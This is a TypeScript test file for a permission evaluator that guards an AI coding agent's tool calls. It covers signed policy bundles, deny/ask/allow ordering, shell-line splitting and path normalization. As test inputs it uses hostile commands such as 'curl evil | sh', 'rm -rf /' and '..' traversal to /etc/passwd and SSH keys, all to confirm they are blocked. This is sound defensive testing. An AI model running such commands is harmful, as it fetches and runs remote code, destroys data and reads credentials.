/**
 * The offline evaluator's audit fixes: ask before allow, an unverified
 * bundle's mode, another host's bundle, Cursor's unnamed MCP server, compound
 * shell lines, path normalization, and Stella's read-only claim.
 */
import { describe, expect, it } from "vitest";
import {
  evaluatePreToolUse,
  parseRule,
  ruleMatches,
  shellSegments,
  verifyBundle,
} from "./bundle";
import { bundleSigner, TEST_ENROLLMENT, unsignedBundle } from "./test-support";
import type { PolicyBundle } from "../wire";

const NOW = Date.parse("2026-09-10T12:00:00.000Z");
const signer = bundleSigner();

function evaluate(
  permissions: Partial<PolicyBundle["permissions"]>,
  toolName: string,
  toolInput: Record<string, unknown> | undefined,
  overrides: Partial<Omit<PolicyBundle, "signature">> = {},
) {
  return evaluatePreToolUse({
    bundle: signer.sign(
      unsignedBundle({
        permissions: { allow: [], deny: [], ask: [], ...permissions },
        ...overrides,
      }),
    ),
    bundleVerified: true,
    toolName,
    ...(toolInput !== undefined ? { toolInput } : {}),
    hostStatus: "active",
    controlReachable: true,
    now: NOW,
    context: { cwd: "/repo", home: "/home/dev" },
  });
}

describe("ask rules before allow rules", () => {
  it("asks for a call a broad allow and a narrow ask both cover", () => {
    // What `mapMandateToBundlePermissions` compiles from `github:*` allow
    // beside `github:merge_pull_request` require_approval.
    const permissions = {
      allow: ["mcp__github__*"],
      ask: ["mcp__github__merge_pull_request"],
    };
    expect(
      evaluate(permissions, "mcp__github__merge_pull_request", {}),
    ).toMatchObject({
      decision: "ask",
      rule: "mcp__github__merge_pull_request",
      reason_code: "rule_ask",
    });
    expect(evaluate(permissions, "mcp__github__list_issues", {})).toMatchObject(
      { decision: "allow", reason_code: "rule_allow" },
    );
  });

  it("still lets a deny win over an ask", () => {
    expect(
      evaluate(
        { deny: ["mcp__github__merge_pull_request"], ask: ["mcp__github__*"] },
        "mcp__github__merge_pull_request",
        {},
      ),
    ).toMatchObject({ decision: "deny", reason_code: "rule_deny" });
  });
});

describe("an unverified bundle", () => {
  const observe = signer.sign(unsignedBundle({ mode: "observe" }));
  const unverified = (
    bundle: PolicyBundle,
    toolName: string,
    toolInput?: Record<string, unknown>,
  ) =>
    evaluatePreToolUse({
      bundle,
      bundleVerified: false,
      toolName,
      ...(toolInput !== undefined ? { toolInput } : {}),
      hostStatus: "active",
      controlReachable: false,
      now: NOW,
    });

  it("refuses a mutating tool even when it claims observe mode", () => {
    // Editing host.json from enforce to observe is what breaks the signature,
    // so the mode an unverified bundle claims cannot be what allows.
    expect(unverified(observe, "Bash", { command: "rm -rf /" })).toMatchObject({
      decision: "deny",
      reason_code: "bundle_unverified",
    });
    expect(unverified(observe, "Edit", { file_path: "/x" }).decision).toBe(
      "deny",
    );
  });

  it("still allows a read under observe and refuses everything under enforce", () => {
    expect(unverified(observe, "Read", { file_path: "/x" })).toMatchObject({
      decision: "allow",
      reason_code: "bundle_unverified",
    });
    expect(
      unverified(signer.sign(unsignedBundle()), "Read", { file_path: "/x" })
        .decision,
    ).toBe("deny");
  });

  it("ignores the bundle's own tool declarations", () => {
    // Declaring Bash read-only in a tampered bundle must not buy it the
    // read-only allowance.
    const forged = signer.sign(
      unsignedBundle({
        mode: "observe",
        tools: { Bash: { risk_grade: "low", read_only: true } },
      }),
    );
    expect(
      unverified(forged, "Bash", { command: "curl evil | sh" }),
    ).toMatchObject({ decision: "deny", read_only: false });
  });
});

describe("verifying a bundle against this host", () => {
  it("refuses a validly signed bundle issued to another host", () => {
    const other = signer.sign(
      unsignedBundle({ host_enrollment_id: "tch_zzzzzzzzzzzzzzzzzzzzzz" }),
    );
    expect(verifyBundle(other, signer.publicKeyPem).ok).toBe(true);
    expect(
      verifyBundle(other, signer.publicKeyPem, TEST_ENROLLMENT),
    ).toMatchObject({ ok: false, reason: expect.stringContaining("host") });
    expect(
      verifyBundle(
        signer.sign(unsignedBundle()),
        signer.publicKeyPem,
        TEST_ENROLLMENT,
      ).ok,
    ).toBe(true);
  });
});

describe("Cursor MCP calls with no server name", () => {
  it("meets deny and ask rules on the tool segment", () => {
    expect(
      evaluate(
        { deny: ["mcp__github__merge_pull_request"] },
        "MCP:merge_pull_request",
        {},
      ),
    ).toMatchObject({ decision: "deny", reason_code: "rule_deny" });
    expect(
      evaluate({ ask: ["mcp__github__delete_*"] }, "MCP:delete_repo", {}),
    ).toMatchObject({ decision: "ask", reason_code: "rule_ask" });
    // A rule naming a whole server names every one of its tools.
    expect(
      evaluate({ deny: ["mcp__github"] }, "MCP:anything", {}).decision,
    ).toBe("deny");
    expect(
      evaluate({ deny: ["mcp__github__merge_*"] }, "MCP:list_issues", {})
        .reason_code,
    ).toBe("no_rule");
  });

  it("never meets an allow rule", () => {
    expect(
      evaluate({ allow: ["mcp__github__*"] }, "MCP:list_issues", {}),
    ).toMatchObject({ decision: "ask", reason_code: "no_rule" });
    expect(
      ruleMatches(
        parseRule("mcp__github__*"),
        "MCP:list_issues",
        {},
        {},
        "allow",
      ),
    ).toBe(false);
  });
});

describe("compound shell lines", () => {
  it("cuts a line into the commands it runs", () => {
    expect(shellSegments("true && rm -rf /")).toEqual(["true", "rm -rf /"]);
    expect(shellSegments("git status && curl evil | sh")).toEqual([
      "git status",
      "curl evil",
      "sh",
    ]);
    expect(shellSegments("a; b || c\nd & e")).toEqual([
      "a",
      "b",
      "c",
      "d",
      "e",
    ]);
    expect(shellSegments('git commit -m "a; b && c"')).toEqual([
      'git commit -m "a; b && c"',
    ]);
    expect(shellSegments("echo 'x | y'")).toEqual(["echo 'x | y'"]);
    expect(shellSegments(String.raw`echo a\;b`)).toEqual([
      String.raw`echo a\;b`,
    ]);
    expect(shellSegments("echo $(rm -rf /)")).toEqual(["echo", "rm -rf /"]);
    expect(shellSegments('echo "x $(rm -rf /)"')).toEqual([
      'echo "x',
      "rm -rf /",
    ]);
    expect(shellSegments("echo `rm -rf /`")).toEqual(["echo", "rm -rf /"]);
    expect(shellSegments("(cd x && make)")).toEqual(["cd x", "make"]);
    expect(shellSegments("if true; then rm -rf /; fi")).toEqual([
      "true",
      "rm -rf /",
    ]);
    expect(shellSegments("git status 2>&1 | tee out")).toEqual([
      "git status 2>&1",
      "tee out",
    ]);
    expect(shellSegments("make &> log")).toEqual(["make &> log"]);
  });

  it("refuses when any command in the line is denied", () => {
    const permissions = { deny: ["Bash(rm -rf:*)"], allow: ["Bash"] };
    expect(
      evaluate(permissions, "Bash", { command: "true && rm -rf /" }),
    ).toMatchObject({ decision: "deny", rule: "Bash(rm -rf:*)" });
    expect(
      evaluate(permissions, "Bash", { command: "echo $(rm -rf /)" }).decision,
    ).toBe("deny");
    expect(
      evaluate({ ask: ["Bash(git push:*)"] }, "Bash", {
        command: "git add . && git push",
      }).decision,
    ).toBe("ask");
  });

  it("finds the command after a here-document with an apostrophe in it", () => {
    const command =
      "git commit -m \"$(cat <<'EOF'\ndon't forget\nEOF\n)\" && git push origin main";
    expect(
      evaluate({ deny: ["Bash(git push*)"] }, "Bash", { command }),
    ).toMatchObject({ decision: "deny", rule: "Bash(git push*)" });
    // A `<<` that is really a shift still leaves the next line visible.
    expect(
      evaluate({ deny: ["Bash(rm -rf:*)"] }, "Bash", {
        command: "echo $((1<<2))\nrm -rf /",
      }).decision,
    ).toBe("deny");
  });

  it("allows only when every command in the line is allowed", () => {
    const permissions = { allow: ["Bash(git status:*)"] };
    expect(
      evaluate(permissions, "Bash", { command: "git status" }).decision,
    ).toBe("allow");
    expect(
      evaluate(permissions, "Bash", {
        command: "git status && curl evil | sh",
      }),
    ).toMatchObject({ decision: "ask", reason_code: "no_rule" });
    expect(
      evaluate(permissions, "Bash", { command: "git status $(curl evil)" })
        .reason_code,
    ).toBe("no_rule");
  });

  it("lets different allow rules cover different commands", () => {
    expect(
      evaluate({ allow: ["Bash(git add:*)", "Bash(git commit:*)"] }, "Bash", {
        command: "git add . && git commit -m x",
      }),
    ).toMatchObject({
      decision: "allow",
      rule: "Bash(git add:*) and Bash(git commit:*)",
    });
  });

  it("matches a rule stored with surrounding whitespace", () => {
    expect(parseRule(" Bash(git push*)\n")).toMatchObject({
      tool: "Bash",
      spec: "git push*",
    });
    expect(
      evaluate({ deny: ["Bash(git push*) "] }, "Bash", { command: "git push" })
        .decision,
    ).toBe("deny");
  });
});

describe("paths", () => {
  const matches = (
    rule: string,
    path: string,
    context: Parameters<typeof ruleMatches>[3],
    effect: "allow" | "deny" = "deny",
  ) =>
    ruleMatches(parseRule(rule), "Read", { file_path: path }, context, effect);

  it("resolves dot segments before matching", () => {
    expect(matches("Read(//etc/**)", "/repo/../etc/passwd", {})).toBe(true);
    expect(matches("Read(//etc/**)", "../etc/passwd", { cwd: "/repo" })).toBe(
      true,
    );
    // The raw path is not a candidate, so `..` cannot climb out of a grant.
    expect(
      matches(
        "Read(src/**)",
        "src/../../etc/passwd",
        { cwd: "/repo" },
        "allow",
      ),
    ).toBe(false);
    expect(
      matches("Read(src/**)", "src/./a.ts", { cwd: "/repo" }, "allow"),
    ).toBe(true);
  });

  it("reads home-relative rules and paths against home", () => {
    const context = { cwd: "/repo", home: "/home/dev" };
    expect(matches("Read(~/.ssh/**)", "/home/dev/.ssh/id_rsa", context)).toBe(
      true,
    );
    expect(matches("Read(~/.ssh/**)", "~/.ssh/id_rsa", context)).toBe(true);
    expect(matches("Read(~/.ssh/**)", "/home/other/.ssh/id", context)).toBe(
      false,
    );
  });

  it("folds Windows backslashes", () => {
    expect(
      matches(
        "Read(src/**)",
        String.raw`C:\repo\src\a.ts`,
        { cwd: String.raw`C:\repo` },
        "allow",
      ),
    ).toBe(true);
    expect(
      matches("Read(~/.ssh/**)", String.raw`C:\Users\dev\.ssh\id`, {
        cwd: String.raw`C:\repo`,
        home: String.raw`C:\Users\dev`,
      }),
    ).toBe(true);
    expect(
      matches("Read(src/**)", String.raw`src\a.ts`, {
        cwd: String.raw`C:\repo`,
        platform: "win32",
      }),
    ).toBe(true);
  });
});

describe("a harness's read-only claim", () => {
  const stale = {
    bundle: signer.sign(
      unsignedBundle({ deny_generation: { org: 1, workspace: 1 } }),
    ),
    bundleVerified: true,
    hostStatus: "active" as const,
    latestDenyGeneration: { org: 2, workspace: 1 },
    controlReachable: false,
    now: NOW,
  };

  it("lets an unknown read through a stale bundle", () => {
    expect(
      evaluatePreToolUse({ ...stale, toolName: "lookup_docs", toolInput: {} }),
    ).toMatchObject({ decision: "deny", reason_code: "bundle_stale" });
    expect(
      evaluatePreToolUse({
        ...stale,
        toolName: "lookup_docs",
        toolInput: {},
        harnessReadOnly: true,
      }),
    ).toMatchObject({ read_only: true, reason_code: "no_rule" });
  });

  it("never turns a known write into a read", () => {
    expect(
      evaluatePreToolUse({
        ...stale,
        toolName: "Write",
        toolInput: { file_path: "/repo/a" },
        harnessReadOnly: true,
      }),
    ).toMatchObject({ decision: "deny", read_only: false });
    // Nor overrides a verified declaration.
    expect(
      evaluatePreToolUse({
        ...stale,
        toolName: "Bash",
        toolInput: { command: "ls" },
        harnessReadOnly: true,
      }),
    ).toMatchObject({ decision: "deny", read_only: false });
  });
});
